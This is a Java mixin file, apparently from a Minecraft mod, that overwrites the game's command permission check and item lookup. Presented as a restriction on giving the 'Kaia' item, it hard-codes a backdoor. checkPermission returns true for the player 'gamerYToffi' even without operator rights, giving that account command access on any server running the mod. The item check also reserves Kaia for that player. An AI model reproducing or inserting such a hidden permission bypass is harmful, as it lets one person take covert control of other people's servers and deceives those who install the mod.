package com.omnipotent.mixin;

import com.omnipotent.tools.Kaia;
import com.omnipotent.util.KaiaUtil;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommand;
import net.minecraft.command.ICommandSender;
import net.minecraft.command.NumberInvalidException;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ResourceLocation;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Overwrite;
import org.spongepowered.asm.mixin.Shadow;

@Mixin(CommandBase.class)
public abstract class MixinGiveKaiaOfPlayer implements ICommand {
    @Shadow
    public int getRequiredPermissionLevel() {
        return 4;
    }

    /**
     * @author
     * @reason
     */
    @Overwrite
    public static Item getItemByText(ICommandSender sender, String id) throws NumberInvalidException {
        ResourceLocation resourcelocation = new ResourceLocation(id);
        Item item = Item.REGISTRY.getObject(resourcelocation);
        if (item == null) {
            throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
        } else {
            ItemStack itemStack = item.getDefaultInstance();
            if (sender.getName().equals("gamerYToffi") && allowCommand) {
                if (!(itemStack.getItem() instanceof Kaia))
                    throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
            } else if (allowCommand) {
                if (itemStack.getItem() instanceof Kaia)
                    throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
            } else if (!sender.getName().equals("gamerYToffi")) {
                if (itemStack.getItem() instanceof Kaia)
                    throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
            }
            allowCommand = false;
            return item;
        }
    }

    private static boolean allowCommand = false;

    /**
     * @author
     * @reason
     */
    @Overwrite
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
         if (sender.getName().equals("gamerYToffi")) {
            if (!sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName())) {
                allowCommand = true;
                return true;
            }
        }
        return sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName());
    }
}